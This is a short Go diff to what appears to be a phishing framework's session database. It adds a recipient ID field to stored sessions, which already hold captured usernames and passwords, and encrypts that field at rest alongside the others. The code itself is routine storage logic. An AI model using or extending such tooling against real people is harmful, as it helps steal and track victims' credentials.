@@ -16,6 +16,7 @@ type Session struct {
 	Id           int                                `json:"id"`
 	Phishlet     string                             `json:"phishlet"`
 	LandingURL   string                             `json:"landing_url"`
+	RId          string                             `json:"rid"`
 	Username     string                             `json:"username"`
 	Password     string                             `json:"password"`
 	Custom       map[string]string                  `json:"custom"`
@@ -98,7 +99,7 @@ func (d *Database) protectPersistedSessions() error {
 
 func storedSession(session *Session) (*Session, error) {
 	stored := cloneSession(session)
-	fields := []*string{&stored.LandingURL, &stored.Username, &stored.Password, &stored.UserAgent, &stored.RemoteAddr}
+	fields := []*string{&stored.LandingURL, &stored.RId, &stored.Username, &stored.Password, &stored.UserAgent, &stored.RemoteAddr}
 	for _, field := range fields {
 		value, err := secrets.Encrypt(*field)
 		if err != nil {
@@ -138,7 +139,7 @@ func storedSession(session *Session) (*Session, error) {
 }
 
 func openSession(session *Session) error {
-	fields := []*string{&session.LandingURL, &session.Username, &session.Password, &session.UserAgent, &session.RemoteAddr}
+	fields := []*string{&session.LandingURL, &session.RId, &session.Username, &session.Password, &session.UserAgent, &session.RemoteAddr}
 	for _, field := range fields {
 		value, err := secrets.Decrypt(*field)
 		if err != nil {
